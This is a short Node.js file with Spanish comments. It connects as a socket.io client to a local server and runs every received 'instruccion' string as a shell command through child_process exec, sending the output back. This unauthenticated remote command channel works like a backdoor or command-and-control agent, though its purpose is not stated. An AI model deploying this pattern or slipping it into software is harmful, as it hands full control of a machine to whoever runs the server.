const express = require('express');
const http = require('http');  // Importar el módulo http
const socketIo = require('socket.io');
const { exec } = require('child_process');
const app = express();

const URL_SERVIDOR = 'http://localhost:42474';
const server = http.createServer(app);
const io = socketIo(server);
const ioClient = require('socket.io-client');
const serverUrl = URL_SERVIDOR;
const socket = ioClient(serverUrl);


// Escuchar eventos del servidor
socket.on('connect', () => {
    console.log(`Conectado al servidor ${URL_SERVIDOR}`);
});


function ejecutarComandoWindows(command) {
    try {
        return new Promise((resolve, reject) => {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    reject(`Error al ejecutar el comando: ${error.message}`);
                } else if (stderr) {
                    reject(`Error en el comando: ${stderr}`);
                } else {
                    resolve(stdout);
                }
            });
        });
    } catch (error) {

    }
}

//eescuchar eventos del servidor
socket.on('recibirInstruccion', (mensaje) => {
    console.log('Mensaje nuevo recibido:', mensaje);

    ejecutarComandoWindows(mensaje.instruccion)
        .then(resultado => {
            socket.emit('respuesta', resultado);
        })
        .catch(error => {
            socket.emit('respuesta', `Error: ${error}`);
        });
});

socket.on('disconnect', () => {
    console.log('Desconectado del servidor');
});



const PORT = 3000;

// Iniciar el servidor
server.listen(PORT, () => {
    console.log(`Servidor escuchando en el puerto ${PORT}`);
});
